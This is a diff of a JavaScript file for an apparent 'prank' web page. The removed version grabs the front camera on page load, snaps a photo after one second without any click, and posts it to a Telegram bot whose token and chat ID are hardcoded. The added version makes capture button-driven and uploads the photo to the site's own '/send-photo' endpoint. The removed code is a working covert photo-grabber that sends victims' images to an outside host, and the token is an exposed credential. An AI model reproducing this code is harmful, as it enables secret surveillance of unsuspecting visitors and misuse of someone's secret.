@@ -1,113 +1,139 @@
 ﻿let stream = null;
 let capturedImage = null;
 
-const TELEGRAM_BOT_TOKEN = "8703334699:AAHXkd029InXgEkSo4CRXM2P3Vl1_mQ4VAc";
-const TELEGRAM_CHAT_ID = "5323236080";
+const intro = document.getElementById('intro');
+const cameraSection = document.getElementById('camera-section');
+const result = document.getElementById('result');
+
+const startBtn = document.getElementById('start-btn');
+const captureBtn = document.getElementById('capture-btn');
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
+const capturedPhoto = document.getElementById('captured-photo');
 
-window.addEventListener('load', () => {
-    requestCameraAccess();
-});
+startBtn.addEventListener('click', requestCameraAccess);
 
 async function requestCameraAccess() {
     try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            alert('Browser ini tidak mendukung akses kamera.');
+            return;
+        }
+
         stream = await navigator.mediaDevices.getUserMedia({
             video: {
                 facingMode: 'user',
                 width: { ideal: 1280 },
                 height: { ideal: 720 }
-            }
+            },
+            audio: false
         });
 
         video.srcObject = stream;
-        video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(() => {
-                capturePhoto();
-            }, 1000);
-        };
+
+        intro.classList.add('hidden');
+        cameraSection.classList.remove('hidden');
+
+        await video.play();
 
     } catch (error) {
-        console.error('Error akses kamera:', error);
-        alert('Izinkan akses kamera untuk melanjutkan!');
+        console.error('Camera error:', error);
+
+        alert(
+            'Akses kamera diperlukan untuk melanjutkan. ' +
+            'Silakan izinkan kamera di browser.'
+        );
     }
 }
 
-function capturePhoto() {
+captureBtn.addEventListener('click', capturePhoto);
+
+async function capturePhoto() {
+    if (!stream || !video.videoWidth) {
+        alert('Kamera belum siap.');
+        return;
+    }
+
+    captureBtn.disabled = true;
+    captureBtn.textContent = 'Sebentar ya ❤️';
+
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    capturedImage = canvas.toDataURL('image/jpeg');
 
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-    }
+    const ctx = canvas.getContext('2d');
 
-    sendPhotoToTelegram();
-    displayCapturedPhoto();
-}
+    ctx.drawImage(
+        video,
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
 
-async function sendPhotoToTelegram() {
+    capturedImage = canvas.toDataURL(
+        'image/jpeg',
+        0.92
+    );
+
+    stopCamera();
+
     try {
-        const blob = await fetch(capturedImage).then(r => r.blob());
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', blob, 'prank.jpg');
-        formData.append('caption', '📸 Foto berhasil dikapture!');
+        await sendPhotoToServer();
 
-        const response = await fetch(
-            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
-            {
-                method: 'POST',
-                body: formData
-            }
-        );
+        cameraSection.classList.add('hidden');
+        result.classList.remove('hidden');
 
-        const data = await response.json();
-        if (data.ok) {
-            console.log('✅ Foto terkirim!');
-        }
+        capturedPhoto.src = capturedImage;
+
     } catch (error) {
-        console.error('❌ Error:', error);
+        console.error('Upload error:', error);
+
+        captureBtn.disabled = false;
+        captureBtn.textContent = 'Coba Lagi ❤️';
+
+        alert(
+            'Foto berhasil diambil, tetapi gagal mengirimnya. ' +
+            'Coba lagi.'
+        );
     }
 }
 
-function displayCapturedPhoto() {
-    video.style.display = 'none';
-    
-    const img = document.createElement('img');
-    img.src = capturedImage;
-    img.id = 'captured-photo';
-    img.style.width = '100%';
-    img.style.height = '100%';
-    img.style.objectFit = 'cover';
-    
-    const container = document.getElementById('camera-permission');
-    container.innerHTML = '';
-    container.appendChild(img);
+function stopCamera() {
+    if (!stream) return;
 
-    const button = document.createElement('button');
-    button.textContent = 'Ulangi';
-    button.id = 'retry-btn';
-    button.style.position = 'absolute';
-    button.style.bottom = '30px';
-    button.style.padding = '12px 30px';
-    button.style.fontSize = '1rem';
-    button.style.background = '#667eea';
-    button.style.color = 'white';
-    button.style.border = 'none';
-    button.style.borderRadius = '50px';
-    button.style.cursor = 'pointer';
-    button.style.fontWeight = '600';
-    
-    container.appendChild(button);
-    
-    button.addEventListener('click', () => {
-        capturedImage = null;
-        video.style.display = 'block';
-        requestCameraAccess();
+    stream.getTracks().forEach(track => {
+        track.stop();
     });
+
+    stream = null;
+    video.srcObject = null;
+}
+
+async function sendPhotoToServer() {
+    const response = await fetch(capturedImage);
+    const blob = await response.blob();
+
+    const formData = new FormData();
+
+    formData.append(
+        'photo',
+        blob,
+        'romantic-prank.jpg'
+    );
+
+    const result = await fetch('/send-photo', {
+        method: 'POST',
+        body: formData
+    });
+
+    const data = await result.json();
+
+    if (!result.ok || !data.ok) {
+        throw new Error(
+            data.error || 'Server gagal menerima foto.'
+        );
+    }
+
+    console.log('❤️ Foto berhasil dikirim ke server.');
 }
